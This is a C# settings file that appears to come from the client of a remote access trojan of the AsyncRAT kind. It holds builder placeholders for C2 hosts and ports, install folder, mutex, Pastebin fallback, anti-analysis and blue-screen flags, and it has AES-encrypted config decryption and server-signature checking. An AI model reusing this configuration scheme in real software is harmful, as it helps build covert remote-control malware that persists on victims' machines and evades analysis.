using Client.Algorithm;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace Client
{
    public static class Settings
    {
#if DEBUG
        public static string Ports = "6606";
        public static string Hosts = "127.0.0.1";
        public static string Version = "0.5.3";
        public static string Install = "false";
        public static string InstallFolder = "AppData";
        public static string InstallFile = "Test.exe";
        public static string Key = "NYAN CAT";
        public static string MTX = "%MTX%";
        public static string Certificate = "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";
        public static string Serversignature = "%Serversignature%";
        public static X509Certificate2 ServerCertificate = new X509Certificate2(Convert.FromBase64String(Certificate));
        public static string Anti = "false";
        public static Aes256 aes256 = new Aes256(Key);
        public static string Pastebin = "null";
        public static string BDOS = "false";

#else
        public static string Ports = "%Ports%";
        public static string Hosts = "%Hosts%";
        public static string Version = "%Version%";
        public static string Install = "%Install%";
        public static string InstallFolder = "%Folder%";
        public static string InstallFile = "%File%";
        public static string Key = "%Key%";
        public static string MTX = "%MTX%";
        public static string Certificate = "%Certificate%";
        public static string Serversignature = "%Serversignature%";
        public static X509Certificate2 ServerCertificate;
        public static string Anti = "%Anti%";
        public static Aes256 aes256;
        public static string Pastebin = "%Pastebin%";
        public static string BDOS = "%BDOS%";
#endif


        public static bool InitializeSettings()
        {
#if DEBUG
            return true;
#endif
            try
            {
                Key = Encoding.UTF8.GetString(Convert.FromBase64String(Key));
                aes256 = new Aes256(Key);
                Ports = aes256.Decrypt(Ports);
                Hosts = aes256.Decrypt(Hosts);
                Version = aes256.Decrypt(Version);
                Install = aes256.Decrypt(Install);
                MTX = aes256.Decrypt(MTX);
                Pastebin = aes256.Decrypt(Pastebin);
                Anti = aes256.Decrypt(Anti);
                BDOS = aes256.Decrypt(BDOS);
                Serversignature = aes256.Decrypt(Serversignature);
                ServerCertificate = new X509Certificate2(Convert.FromBase64String(aes256.Decrypt(Certificate)));
                return VerifyHash();
            }
            catch { return false; }
        }

        private static bool VerifyHash()
        {
            try
            {
                var csp = (RSACryptoServiceProvider)ServerCertificate.PublicKey.Key;
                return csp.VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Serversignature));
            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}